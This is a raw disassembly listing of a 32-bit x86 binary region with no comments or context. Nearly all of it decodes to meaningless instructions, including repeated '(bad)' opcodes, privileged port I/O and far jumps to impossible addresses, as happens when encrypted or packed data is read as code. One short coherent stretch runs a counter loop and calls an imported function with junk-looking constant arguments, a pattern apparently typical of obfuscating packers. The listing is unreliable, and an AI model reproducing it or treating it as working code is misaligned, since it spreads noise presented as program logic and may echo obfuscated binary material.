  404838:	ins    BYTE PTR es:[edi],dx
  404839:	sbb    eax,0xb37c83da
  40483e:	icebp  
  40483f:	push   ebp
  404840:	cmp    DWORD PTR [esi+0x40a4a684],ebp
  404846:	(bad)  
  404847:	mov    bl,0xc8
  404849:	mov    al,ds:0x4d15bc24
  40484e:	(bad)  
  40484f:	fmul   st,st(7)
  404851:	int    0x5
  404853:	xchg   esi,eax
  404854:	mov    ecx,0xe0b274ae
  404859:	xchg   ecx,eax
  40485a:	xchg   esi,eax
  40485b:	rol    BYTE PTR [ecx-0x30],cl
  40485e:	xchg   BYTE PTR [esp+edi*1],cl
  404861:	fisub  DWORD PTR [esi]
  404863:	sbb    bl,BYTE PTR [ebx-0x7a2285d2]
  404869:	fisub  WORD PTR [ebp-0x3c0d9d1b]
  40486f:	push   edx
  404870:	imul   eax,DWORD PTR [ecx+eiz*4],0x10
  404874:	mov    ah,0x93
  404876:	sahf   
  404877:	push   cs
  404878:	sbb    al,0x87
  40487a:	or     BYTE PTR [ebx+0x64c51da0],bl
  404880:	dec    ebx
  404881:	dec    edx
  404883:	jle    0x4048e8
  404885:	in     eax,dx
  404886:	jns    0x4048e5
  404888:	mov    ah,0xb1
  40488a:	arpl   WORD PTR [ebx+0x2b],si
  40488d:	jge    0x40488c
  40488f:	dec    eax
  404890:	and    eax,0x57428b4e
  404895:	inc    ebx
  404896:	test   al,0xf8
  404898:	ja     0x4048fb
  40489a:	mov    eax,0xb6fab9a1
  40489f:	xlat   BYTE PTR ds:[ebx]
  4048a0:	into   
  4048a1:	inc    ebx
  4048a2:	(bad)  
  4048a3:	cmp    edi,DWORD PTR [eax-0x6c]
  4048a6:	sub    al,0xe8
  4048a8:	(bad)  
  4048a9:	cmp    al,0x20
  4048ab:	xchg   esi,eax
  4048ac:	pop    esp
  4048ad:	imul   esi,DWORD PTR [edi+eiz*8-0x6d],0x4939664a
  4048b5:	mov    WORD PTR [ebx+0x36],cs
  4048b8:	xor    eax,0xd278000
  4048bd:	mov    edi,0xd6359838
  4048c2:	sub    cl,BYTE PTR [ebx]
  4048c4:	popa   
  4048c5:	jno    0x404852
  4048c7:	sti    
  4048c8:	mov    bl,0xef
  4048ca:	aam    0x7c
  4048cc:	xchg   BYTE PTR ds:0x81290ba4,al
  4048d2:	pop    eax
  4048d3:	and    bh,BYTE PTR [ebp-0x6a890236]
  4048d9:	push   0xad028e5
  4048de:	inc    esp
  4048df:	sbb    BYTE PTR [eax],dh
  4048e1:	xchg   DWORD PTR [ecx+edi*1-0x20],esi
  4048e5:	mov    WORD PTR [eax],es
  4048e7:	nop
  4048e8:	cmp    DWORD PTR [ecx+0x479353d4],esi
  4048ee:	adc    ebp,ecx
  4048f0:	and    dh,BYTE PTR [edi-0x1e]
  4048f3:	loope  0x4048b5
  4048f5:	cld    
  4048f6:	mov    al,0xf4
  4048f8:	xchg   ebx,eax
  4048f9:	jp     0x4048aa
  4048fb:	sbb    eax,0x610f0546
  404900:	ds cmp eax,0xb359e37b
  404906:	ja     0x404892
  404908:	int3   
  404909:	sub    dl,BYTE PTR ds:0x1eb158a
  40490f:	cdq    
  404910:	sbb    eax,DWORD PTR [edi]
  404912:	mov    eax,ds:0x2f68640e
  404917:	cmp    al,0xd6
  404919:	dec    ecx
  40491a:	push   ecx
  40491b:	jo     0x404999
  40491d:	adc    BYTE PTR [ebx+0x1e11d67e],dl
  404923:	dec    esp
  404924:	xchg   ebp,eax
  404925:	fsub   QWORD PTR ds:0x78b88462
  40492b:	adc    al,0x68
  40492d:	in     al,dx
  40492e:	retf   0xed16
  404931:	(bad)  
  404932:	mov    al,ds:0xfdbd3ed8
  404937:	sub    ch,BYTE PTR [eax+edi*8]
  40493a:	test   BYTE PTR [ebx+0x5f23e3e],dh
  404940:	adc    eax,0xdac436a5
  404945:	add    eax,0xe7ff1e83
  40494a:	xor    BYTE PTR [edi-0x42],ah
  40494d:	jnp    0x404992
  40494f:	sbb    BYTE PTR ds:0x55a38e6a,bh
  404955:	mov    ah,0x38
  404957:	adc    BYTE PTR [ebx-0x22],al
  40495a:	dec    ebx
  40495b:	add    ch,BYTE PTR [esi]
  40495d:	mov    ebx,DWORD PTR [eax+0xc]
  404960:	sbb    bh,BYTE PTR [edi+0x21c8ef37]
  404966:	sbb    al,0xb5
  404968:	push   0xffffff9a
  40496a:	or     eax,esp
  40496c:	pop    edx
  40496d:	retf   
  40496e:	mov    bh,BYTE PTR [esi-0x10df94ee]
  404974:	outs   dx,BYTE PTR ds:[esi]
  404975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404976:	fstp   DWORD PTR ds:0x9bda799d
  40497c:	arpl   bp,bx
  40497e:	fld    TBYTE PTR [edi+0x10]
  404981:	bound  ebp,QWORD PTR [edx-0x4133c9fa]
  404987:	add    al,0x34
  404989:	inc    edi
  40498a:	cld    
  40498b:	fs in  al,0x5f
  40498e:	cwde   
  40498f:	loope  0x404959
  404991:	test   DWORD PTR [edi-0x40978ddc],edi
  404997:	or     bl,BYTE PTR [ebx+0x1c7ff224]
  40499d:	xchg   ebp,eax
  40499e:	pop    ds
  40499f:	jb     0x4049a2
  4049a1:	nop
  4049a2:	dec    ebx
  4049a3:	push   eax
  4049a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049a5:	xchg   ebx,eax
  4049a6:	xchg   ecx,eax
  4049a7:	aaa    
  4049a8:	fadd   st(3),st
  4049aa:	popf   
  4049ab:	adc    edx,DWORD PTR [edi-0x53]
  4049ae:	xchg   ebx,eax
  4049af:	pop    esp
  4049b0:	icebp  
  4049b1:	mov    edi,0xdf7544b
  4049b6:	mov    BYTE PTR [edi-0x28],ch
  4049b9:	pop    esp
  4049ba:	pop    ss
  4049bb:	test   al,0x75
  4049bd:	inc    esp
  4049be:	fsub   DWORD PTR [esi+ebp*1+0x48]
  4049c2:	jae    0x4049e5
  4049c4:	rol    esp,cl
  4049c6:	enter  0xe863,0xb5
  4049ca:	cmp    BYTE PTR [ebx-0x8d65e92],ah
  4049d0:	cdq    
  4049d1:	mov    ebx,0x4d41ea9d
  4049d6:	out    0x48,eax
  4049d8:	inc    ecx
  4049d9:	mov    esp,0xf24314c6
  4049de:	pop    esi
  4049df:	loope  0x4049af
  4049e1:	inc    edi
  4049e2:	mov    esp,0xd628933
  4049e7:	add    BYTE PTR [ebx+0x0],dh
  4049ea:	inc    esp
  4049eb:	call   0x4e719b0c
  4049f0:	pusha  
  4049f1:	push   0x4cca065
  4049f6:	add    BYTE PTR [edi],al
  4049f8:	xor    al,0x2d
  4049fa:	jmp    0xfc32:0x7ce674b2
  404a01:	xchg   esi,eax
  404a02:	push   es
  404a03:	jmp    0x404a16
  404a05:	xor    al,BYTE PTR [edx-0x5d]
  404a08:	in     eax,dx
  404a09:	stc    
  404a0a:	mov    ah,0xdb
  404a0c:	sub    eax,0x77c98efb
  404a11:	or     BYTE PTR [esi-0x6f76e2],ah
  404a17:	sub    DWORD PTR [ecx+0x4ff4e1e2],0xcac4dfb8
  404a21:	or     DWORD PTR [edi-0x5b],ebp
  404a24:	frstor [ebx-0x6c]
  404a27:	mov    al,ds:0x7057d192
  404a2c:	out    0x5f,al
  404a2e:	call   0xe947:0x8b9f882c
  404a35:	cs pop ebx
  404a37:	sbb    eax,ebp
  404a39:	js     0x404a30
  404a3b:	pop    ds
  404a3c:	mov    ebp,0x35dac1e7
  404a41:	mov    edx,0x208c510f
  404a46:	push   eax
  404a47:	iret   
  404a48:	je     0x404a06
  404a4a:	pop    eax
  404a4b:	push   ebx
  404a4c:	inc    ebp
  404a4d:	mov    ecx,0x7510850
  404a52:	and    DWORD PTR ds:0x42afb9,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42afb9
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42afb9,esi
  404a69:	cmp    DWORD PTR ds:0x42afb9,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42afb9,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42afb9
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42afb9,esi
  404ab7:	cmp    DWORD PTR ds:0x42afb9,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42af7d
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	or     BYTE PTR gs:[ecx+0x782e46a7],0x78
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404a96
  404aef:	fistp  DWORD PTR [edi-0x15]
  404af2:	push   edi
  404af3:	and    eax,0x5654dd1f
  404af8:	out    dx,eax
  404af9:	mov    DWORD PTR ds:0x5108ffa8,ebp
  404aff:	xabort 0x11
  404b02:	imul   ecx,esp,0x1b
  404b05:	sbb    BYTE PTR [ebx+0x6eb99c3b],ah
  404b0b:	nop
  404b0c:	icebp  
  404b0d:	pushf  
  404b0e:	adc    BYTE PTR [ecx+edi*8-0x68d101e4],bl
  404b15:	jb     0x404b18
  404b17:	es jmp 0x9abcf5e1
  404b1d:	pop    ss
  404b1e:	loopne 0x404b96
  404b20:	inc    edx
  404b21:	or     bl,ch
  404b23:	(bad)  
  404b24:	imul   cl
  404b26:	ret    0x308f
  404b29:	into   
  404b2a:	lds    edi,FWORD PTR [esi+0x3e]
  404b2d:	push   cs
  404b2e:	inc    edi
  404b2f:	push   edx
  404b30:	mov    dh,0x62
  404b32:	fist   WORD PTR [ebx+0xfe345f4]
  404b38:	out    dx,eax
  404b39:	xor    bh,BYTE PTR [edi-0x14]
  404b3c:	loopne 0x404b75
  404b3e:	xlat   BYTE PTR ds:[ebx]
  404b3f:	xchg   edx,eax
  404b40:	or     ecx,DWORD PTR [edi-0x379c19cb]
  404b46:	mov    esp,0xf187e040
  404b4b:	xor    edx,eax
  404b4d:	mov    edi,0x9a6fa6a4
  404b52:	test   al,0x61
  404b54:	dec    eax
  404b55:	pop    edi
  404b56:	mov    bh,0xca
  404b58:	pop    ss
  404b59:	sbb    al,0x21
  404b5b:	push   ebp
  404b5c:	jmp    0xe8c1:0x8c834a86
  404b63:	inc    esp
  404b64:	fadd   QWORD PTR [ebp-0xa16e1d9]
  404b6a:	sar    DWORD PTR [eax],cl
  404b6c:	call   0xfba67508
  404b71:	or     ecx,edi
  404b73:	xor    al,0xd9
  404b75:	xchg   esp,eax
  404b76:	retf   0x86c2
  404b79:	lods   al,BYTE PTR ds:[esi]
  404b7a:	outs   dx,DWORD PTR ds:[esi]
  404b7b:	sub    dl,ah
  404b7d:	(bad)  
  404b7e:	nop
  404b7f:	or     edi,DWORD PTR [esi+eax*1]
  404b82:	aam    0x67
  404b84:	aaa    
  404b85:	pop    edi
  404b86:	xchg   esi,eax
  404b87:	jmp    0xbc344884
  404b8c:	sbb    cl,BYTE PTR [esi-0xf]
  404b8f:	sahf   
  404b90:	or     al,0x19
  404b92:	mov    esi,0xee751d
  404b97:	pushf  
  404b98:	sub    al,0x77
  404b9a:	dec    edi
  404b9b:	bound  ebx,QWORD PTR [ebx+0x49]
  404b9e:	inc    edx
  404b9f:	adc    BYTE PTR [ebp-0x3de6e70f],ah
  404ba5:	cdq    
  404ba6:	cmp    ch,ah
  404ba8:	je     0x404bc5
  404baa:	mov    bh,0xa5
  404bac:	mov    WORD PTR ds:0x5e7c3e6c,?
  404bb2:	(bad)  
  404bb3:	xor    dh,BYTE PTR [ebp-0x7d2aec10]
  404bb9:	dec    esp
  404bba:	sub    eax,0xd0670e49
  404bbf:	mov    ebp,0x234d5679
  404bc4:	sub    al,BYTE PTR [ebx]
  404bc6:	jmp    0x404c1c
  404bc8:	adc    DWORD PTR [eax-0x77],eax
  404bcb:	fbld   TBYTE PTR [esi+0x525ae7a1]
  404bd1:	(bad)  
  404bd2:	outs   dx,BYTE PTR ds:[esi]
  404bd3:	mov    ebx,0xac214ef1
  404bd8:	pop    esi
  404bd9:	call   0xc322:0xa0caa54
  404be0:	ins    DWORD PTR es:[edi],dx
  404be1:	test   BYTE PTR [ebp+ebx*1-0x6465e202],ch
  404be8:	xchg   esp,eax
  404be9:	(bad)  
  404bea:	mov    ds:0x424e822a,eax
  404bef:	inc    ecx
  404bf0:	xchg   ebp,eax
  404bf1:	sub    al,0x7
  404bf3:	outs   dx,BYTE PTR ds:[esi]
  404bf4:	push   ebp
  404bf5:	fisttp WORD PTR [edx-0x3]
  404bf8:	pushf  
  404bf9:	cmp    eax,0x9b9f5f18
  404bfe:	mov    ds,ebx
  404c00:	push   ebx
  404c01:	mov    ds:0x3a325437,al
  404c06:	sub    ch,BYTE PTR [ecx-0x5e]
  404c09:	(bad)  
  404c0a:	mov    dl,bl
  404c0c:	inc    esi
  404c0d:	in     eax,dx
  404c0e:	rcr    BYTE PTR [ebx+eax*1],cl
  404c11:	popf   
  404c12:	xor    eax,0x491599bb
  404c17:	dec    DWORD PTR fs:[edx+eiz*4]
  404c1b:	(bad)  
  404c1c:	pop    ebx
  404c1d:	inc    esp
  404c1e:	cli    
  404c1f:	das    
  404c20:	or     DWORD PTR [edi],esi
  404c22:	call   0xc3eb:0x24a6aee5
  404c29:	mov    cl,0xf1
  404c2b:	scas   eax,DWORD PTR es:[edi]
  404c2c:	inc    esp
  404c2d:	call   0x83:0x9a3505cc
  404c34:	inc    esp
  404c35:	and    al,0x69
  404c37:	test   eax,0xde201cd0
  404c3c:	cmp    DWORD PTR [esi+eiz*2],ecx
  404c3f:	pop    esp
  404c40:	int    0x9d
  404c42:	pusha  
  404c43:	xor    BYTE PTR [edi-0x2aa5a47d],dl
  404c49:	stc    
  404c4a:	les    esp,FWORD PTR [edx+0xf8593b6]
  404c50:	xchg   edx,eax
  404c51:	xor    BYTE PTR [eax],0x53
  404c54:	xchg   esi,eax
  404c55:	or     ah,BYTE PTR [ebp-0x7779e560]
  404c5b:	in     eax,dx
  404c5c:	mov    ecx,0x80b4832
  404c61:	jnp    0x404c30
  404c63:	add    ebp,DWORD PTR [ecx+eax*1+0x18]
  404c67:	and    ah,dl
  404c69:	add    edi,DWORD PTR [eax+0x7afabb2e]
  404c6f:	or     al,0x24
  404c71:	dec    esp
  404c72:	scas   al,BYTE PTR es:[edi]
  404c73:	int3   
  404c74:	dec    ebx
  404c75:	imul   ebp,edx,0x72
  404c78:	(bad)  
  404c79:	sub    BYTE PTR cs:[eax],cl
  404c7c:	mov    ds:0x7e66b541,al
  404c81:	rol    DWORD PTR [ebp+0x4e],0x8c
  404c85:	add    eax,0x783612
  404c8a:	jbe    0x404cc2
  404c8c:	push   0xd1afb27b
  404c91:	and    ebx,DWORD PTR [edi-0x6e]
  404c94:	out    dx,eax
  404c95:	mov    bl,0xe0
  404c97:	add    BYTE PTR [ecx-0x4d641546],bh
  404c9d:	xchg   edi,eax
  404c9e:	pop    ebx
  404c9f:	addr16 (bad) 
  404ca1:	sub    al,0xac
  404ca3:	rcl    BYTE PTR [esi+0x6429c82f],0x9
  404caa:	aaa    
  404cab:	ror    DWORD PTR [esi-0x30],1
  404cae:	sub    al,0x50
  404cb0:	ror    DWORD PTR [edi],cl
  404cb2:	lods   eax,DWORD PTR ds:[esi]
  404cb3:	ds jl  0x404cc6
  404cb6:	lock popa 
  404cb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cb9:	inc    esi
  404cba:	ret    
  404cbb:	xor    al,BYTE PTR [edx+eax*1+0x2c075147]
  404cc2:	add    BYTE PTR [ecx],dl
  404cc4:	cmp    ecx,DWORD PTR [edi]
  404cc6:	inc    edx
  404cc7:	outs   dx,BYTE PTR ds:[esi]
  404cc8:	lock lds ecx,FWORD PTR ds:[edi+ecx*8+0x53]
  404cce:	enter  0xa876,0x41
  404cd2:	or     al,0x2d
  404cd4:	nop
  404cd5:	ficomp DWORD PTR [edx-0x13da1fc3]
  404cdb:	mov    WORD PTR [edi-0x7ce27b31],ds
  404ce1:	mov    edx,0xab701d8e
  404ce6:	inc    ebx
  404ce7:	(bad)  
  404ce8:	aaa    
  404ce9:	das    
  404cea:	adc    al,dl
  404cec:	mov    ah,0xeb
  404cee:	cmp    eax,0x4f3f0302
  404cf3:	sbb    dl,BYTE PTR [edx+0x2a]
  404cf6:	bound  ebp,QWORD PTR [ebx]
  404cf8:	es sbb eax,0xe213610e
  404cfe:	dec    esi
  404cff:	pop    ebp
  404d00:	mov    dh,BYTE PTR [edi-0x6376c14]
  404d06:	mov    ss,WORD PTR [ebp-0x717436e5]
  404d0c:	cld    
  404d0d:	mov    al,ds:0xbf7bdbf4
  404d12:	fcomp  QWORD PTR [ecx-0x4f]
  404d15:	xor    al,0xd5
  404d17:	scas   eax,DWORD PTR es:[edi]
  404d18:	xor    eax,0x8c1995ba
  404d1d:	push   0x91f47ed2
  404d22:	xchg   ebp,eax
  404d23:	push   edx
  404d24:	or     eax,ecx
  404d26:	xchg   ecx,eax
  404d27:	push   0x488788da
  404d2c:	outs   dx,BYTE PTR ds:[esi]
  404d2d:	pop    edi
  404d2e:	push   0xffffffd6
  404d30:	dec    edx
  404d31:	xchg   ebp,eax
  404d32:	inc    ebx
  404d33:	inc    ecx
  404d34:	fnsave [eax+0x2f]
  404d37:	retf   0x9f1a
  404d3a:	xchg   ebx,eax
  404d3b:	fild   WORD PTR [eax]
  404d3d:	or     esi,DWORD PTR gs:[esi-0xa]
  404d41:	xchg   edi,eax
  404d42:	ins    DWORD PTR es:[edi],dx
  404d43:	mov    bl,0x95
  404d45:	dec    esi
  404d46:	aad    0xd6
  404d48:	sub    ch,BYTE PTR [ebp-0x3b]
  404d4b:	mov    ch,0x93
  404d4d:	xor    al,0x53
  404d4f:	not    BYTE PTR [edx]
  404d51:	inc    esi
  404d52:	and    al,0x25
  404d54:	xchg   BYTE PTR [ecx+0x4626ed3f],ah
  404d5a:	adc    ecx,0x38f96589
  404d60:	fisttp DWORD PTR [esi+edi*2+0x6b]
  404d64:	lea    esp,[edx-0x18e2792e]
  404d6a:	push   edi
  404d6b:	ins    DWORD PTR es:[edi],dx
  404d6c:	mov    eax,0x1010185e
  404d71:	push   es
  404d72:	dec    edx
  404d73:	jg     0x404d92
  404d75:	fwait
  404d76:	pusha  
  404d77:	mov    ebx,0xda278dbb
  404d7c:	cld    
  404d7d:	inc    ecx
  404d7e:	mov    bl,0xb4
  404d80:	mov    ds:0x84883e35,eax
  404d85:	mov    esp,0x3a6cd73a
  404d8a:	outs   dx,BYTE PTR ds:[esi]
  404d8b:	xchg   edx,eax
  404d8c:	ror    DWORD PTR [eax+0x8],1
  404d8f:	xchg   edx,eax
  404d90:	mov    eax,0x9c10b845
  404d95:	inc    ebx
  404d96:	sbb    al,0x13
  404d98:	jns    0x404d80
  404d9a:	in     eax,0x11
  404d9c:	fst    DWORD PTR [ebx+0x4dd6772c]
  404da2:	pop    ss
  404da3:	dec    edx
  404da4:	test   DWORD PTR ds:0x4e4bd614,ecx
  404daa:	pop    esp
  404dab:	mov    bh,0xaf
  404dad:	and    DWORD PTR [edi+ebx*8],edx
  404db0:	jmp    0xfe97:0x310040f7
  404db7:	adc    DWORD PTR [ebx+ebx*4],esi
  404dba:	rol    ah,cl
  404dbc:	mov    ah,BYTE PTR [ebx+0x57732067]
  404dc2:	mov    edi,DWORD PTR [ebp+0x10]
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	mov    DWORD PTR [ebp+0x339ba88b],eax
  404dee:	js     0x404e68
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404e65
  404df5:	mov    edi,0x6c03f3d4
  404dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dfb:	xor    esi,edi
  404dfd:	inc    esi
  404dfe:	inc    edi
  404dff:	adc    eax,0x1fd7a1a8
  404e05:	xchg   BYTE PTR [ecx],ch
  404e07:	sti    
  404e08:	ins    BYTE PTR es:[edi],dx
  404e09:	sub    eax,0x79aa5637
  404e0e:	or     al,0xb6
  404e10:	sub    al,0xd1
  404e12:	cmp    bl,dh
  404e14:	inc    edi
  404e15:	jmp    0xba7e:0xb6c0959f
  404e1c:	push   0x1d
  404e1e:	jne    0x404e14
  404e20:	sub    edx,DWORD PTR [eax-0x7667dc09]
  404e26:	mov    bh,0x87
  404e28:	pop    eax
  404e29:	pop    ebx
  404e2a:	aad    0x59
  404e2c:	js     0x404df0
  404e2e:	xor    DWORD PTR [edx-0x28],esp
  404e31:	ins    BYTE PTR es:[edi],dx
  404e32:	add    BYTE PTR [ecx-0x3c],0xdb
  404e36:	jo     0x404e27
  404e38:	popa   
  404e39:	shr    ebp,0xe9
  404e3c:	aam    0x39
  404e3e:	lods   eax,DWORD PTR ds:[esi]
  404e3f:	mov    DWORD PTR [ebp-0x28],ebx
  404e42:	fs add al,ah
  404e45:	mov    al,ds:0xc10feb93
  404e4a:	and    esi,DWORD PTR [ebp-0x1887d39b]
  404e50:	addr16 pusha 
  404e52:	push   0x68
  404e54:	jmp    0x252f3b4a
  404e59:	fnstcw WORD PTR [eax+0x5a577fef]
  404e5f:	sub    eax,0x23f16b0
  404e64:	or     edi,DWORD PTR [eax]
  404e66:	lods   al,BYTE PTR ds:[esi]
  404e67:	mov    dl,0xcb
  404e69:	xor    al,0xdf
  404e6b:	in     eax,dx
  404e6c:	adc    DWORD PTR [esi-0x332a4ad9],esp
  404e72:	xor    edi,DWORD PTR [ecx+eiz*8+0x6c5b4c34]
  404e79:	fldcw  WORD PTR [ecx+edx*4]
  404e7c:	shr    al,0xff
  404e7f:	inc    ecx
  404e80:	and    DWORD PTR [ebx-0x21],esp
  404e83:	and    BYTE PTR [ecx+0x702ceb84],0x91
  404e8a:	outs   dx,BYTE PTR ds:[esi]
  404e8b:	in     al,0x13
  404e8d:	sbb    BYTE PTR [ecx],0x67
  404e90:	cmc    
  404e91:	retf   
  404e92:	sbb    BYTE PTR [ebp-0x42e8e7ae],al
  404e98:	xor    dh,BYTE PTR [eax+0x1b67760a]
  404e9e:	in     eax,0xe
  404ea0:	and    eax,0xb93001e7
  404ea5:	fadd   DWORD PTR [eax]
  404ea7:	and    eax,0x40325d0a
  404eac:	sub    DWORD PTR [ebx+esi*2],eax
  404eaf:	inc    ecx
  404eb0:	mov    eax,0xfa855b00
  404eb5:	cmc    
  404eb6:	fiadd  WORD PTR [esi-0x5ea104e0]
  404ebc:	imul   esi,esi,0x833dbeb2
  404ec2:	mov    bl,0xac
  404ec4:	idiv   BYTE PTR [edi+ecx*8+0x55]
  404ec8:	jl     0x404e92
  404eca:	and    ebp,ebx
  404ecc:	pop    ebp
  404ecd:	and    al,0x32
  404ecf:	jl     0x404f37
  404ed1:	push   esp
  404ed2:	fnstsw WORD PTR [ebx]
  404ed4:	test   BYTE PTR [ecx+0x39],cl
  404ed7:	bound  esi,QWORD PTR [ecx]
  404ed9:	sub    eax,0xe4e540f9
  404ede:	inc    edi
  404edf:	push   es
  404ee0:	jnp    0x404efb
  404ee2:	cmp    ecx,DWORD PTR [ecx-0x6]
  404ee5:	es aad 0x94
  404ee8:	add    BYTE PTR [ebp+0x45c631b],ah
  404eee:	outs   dx,BYTE PTR ds:[esi]
  404eef:	dec    ebx
  404ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ef1:	dec    edi
  404ef2:	or     al,0x1
  404ef4:	aaa    
  404ef5:	mov    esi,0xb00a3fbb
  404efa:	xor    bl,ch
  404efc:	cmp    eax,DWORD PTR [ebp+0x62]
  404eff:	adc    dl,dh
  404f01:	lds    esp,FWORD PTR cs:[ebp+0x22]
  404f05:	ja     0x404f2a
  404f07:	jecxz  0x404f59
  404f09:	sti    
  404f0a:	push   edi
  404f0b:	cmp    edx,esi
  404f0d:	or     bl,ah
  404f0f:	add    dl,BYTE PTR [ebx-0x3d]
  404f12:	ret    
  404f13:	xor    al,0x35
  404f15:	adc    BYTE PTR es:[edi+eax*1],dh
  404f19:	das    
  404f1a:	dec    ecx
  404f1b:	dec    edi
  404f1c:	jnp    0x404ecf
  404f1e:	inc    edx
  404f1f:	stos   DWORD PTR es:[edi],eax
  404f20:	mov    WORD PTR [esi-0x1f6cfa17],?
  404f26:	mov    ah,0x1e
  404f28:	and    ecx,esi
  404f2a:	jp     0x404f94
  404f2c:	sub    ch,bl
  404f2e:	outs   dx,BYTE PTR ds:[esi]
  404f2f:	and    BYTE PTR [edx],dl
  404f31:	iret   
  404f32:	or     ebp,ebp
  404f34:	jge    0x404ece
  404f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f37:	out    dx,al
  404f38:	das    
  404f39:	mov    WORD PTR [edi-0x3e],ds
  404f3c:	xchg   ecx,eax
  404f3d:	scas   al,BYTE PTR es:[edi]
  404f3e:	dec    DWORD PTR [edx-0x30a27ec1]
  404f44:	dec    edx
  404f45:	ret    0x7ed5
  404f48:	rcl    BYTE PTR [ecx],1
  404f4a:	jnp    0x404ee4
  404f4c:	shl    BYTE PTR [ebx],0x81
  404f4f:	inc    ebx
  404f50:	cmp    DWORD PTR [edi+0x75],0xffffffe1
  404f54:	jne    0x404f71
  404f56:	ins    DWORD PTR es:[edi],dx
  404f57:	lock jl 0x404f32
  404f5a:	pusha  
  404f5b:	jno    0x404f40
  404f5d:	pop    esp
  404f5e:	add    al,BYTE PTR [esp+ebx*4-0xff5d033]
  404f65:	call   0x106e9ab0
  404f6a:	outs   dx,DWORD PTR ds:[esi]
  404f6b:	stos   DWORD PTR es:[edi],eax
  404f6c:	cs pop ebx
  404f6e:	push   ecx
  404f6f:	addr16 xchg ecx,eax
  404f71:	pop    ecx
  404f72:	mov    ah,BYTE PTR [edi-0x3f]
  404f75:	pop    eax
  404f76:	xchg   ebx,eax
  404f77:	jne    0x404efb
  404f79:	mov    esi,0xf342a3fd
  404f7e:	ror    BYTE PTR [ebp+0x70],0xb0
  404f82:	xchg   ecx,eax
  404f83:	jle    0x404ffe
  404f85:	jbe    0x404fdd
  404f87:	jp     0x404f78
  404f89:	popf   
  404f8a:	daa    
  404f8b:	sub    eax,0x91c731ae
  404f90:	cs (bad) 
  404f92:	mov    dl,0x1c
  404f94:	push   ebx
  404f95:	ds jae 0x404f67
  404f98:	xor    al,0x2f
  404f9a:	dec    edx
  404f9b:	pop    esi
  404f9c:	adc    BYTE PTR [edx],ah
  404f9e:	cdq    
  404f9f:	push   edi
  404fa0:	mov    eax,0x5d4e1fb3
  404fa5:	add    ebx,ebx
  404fa7:	mov    ah,BYTE PTR [ecx+edi*8]
  404faa:	in     eax,dx
  404fab:	add    DWORD PTR [esp+ebp*2],ebx
  404fae:	sti    
  404faf:	mov    ds:0xf3fbb3e4,eax
  404fb4:	mov    WORD PTR [ebx],?
  404fb6:	test   eax,0x48e743b7
  404fbb:	scas   eax,DWORD PTR es:[edi]
  404fbc:	mov    ds,eax
  404fbe:	push   esi
  404fbf:	and    BYTE PTR [esi+ebx*2-0x49288117],al
  404fc6:	pop    ds
  404fc7:	in     al,0x9f
  404fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fca:	fucom  st(5)
  404fcd:	repz add DWORD PTR [ecx+0x33a43c14],edi
  404fd4:	push   ebx
  404fd5:	aas    
  404fd6:	adc    esp,DWORD PTR [ebx-0x1ac424d9]
  404fdc:	cmp    cl,BYTE PTR [ebx]
  404fde:	pop    edi
  404fdf:	int3   
  404fe0:	lds    edx,FWORD PTR [esi+0x887a728]
  404fe6:	dec    ecx
  404fe7:	popa   
  404fe8:	pop    ebp
  404fe9:	test   eax,0x67f35d0a
  404fee:	jmp    0x405007
  404ff0:	xchg   ebp,eax
  404ff1:	popa   
  404ff2:	popa   
  404ff3:	in     eax,dx
  404ff4:	(bad)  
  404ff5:	add    DWORD PTR [ebx-0x66],ebx
  404ff8:	mov    ch,0x61
  404ffa:	(bad)  [esi+0x15]
  404ffd:	inc    esi
  404ffe:	cmp    eax,0xba769d7f
  405003:	mov    eax,ds:0xedc239e5
  405008:	xchg   esp,eax
  405009:	sub    eax,0xac30bd2d
  40500e:	mov    ds:0x9895391b,eax
  405013:	push   edi
  405014:	(bad)  
  405015:	es sahf 
  405017:	ret    
  405018:	pop    ebp
  405019:	and    esp,esp
  40501b:	add    eax,0x5db300cf
  405020:	xchg   esi,eax
  405021:	mov    DWORD PTR [edi-0x1f],0xc72f2704
  405028:	fdiv   QWORD PTR [ecx]
  40502a:	xchg   esp,eax
  40502b:	pop    es
  40502c:	lahf   
  40502d:	and    bl,BYTE PTR [edx+0x9027174]
  405033:	sahf   
  405034:	mov    ds:0x746c668d,al
  405039:	data16 jns 0x405002
  40503c:	mov    ss,eax
  40503e:	test   dl,dl
  405040:	ja     0x405035
  405042:	aaa    
  405043:	and    DWORD PTR [esi+0x671dcfe3],ebx
  405049:	mov    ds:0x80cf7f6f,eax
  40504e:	sbb    DWORD PTR [ebx+0x2d],ecx
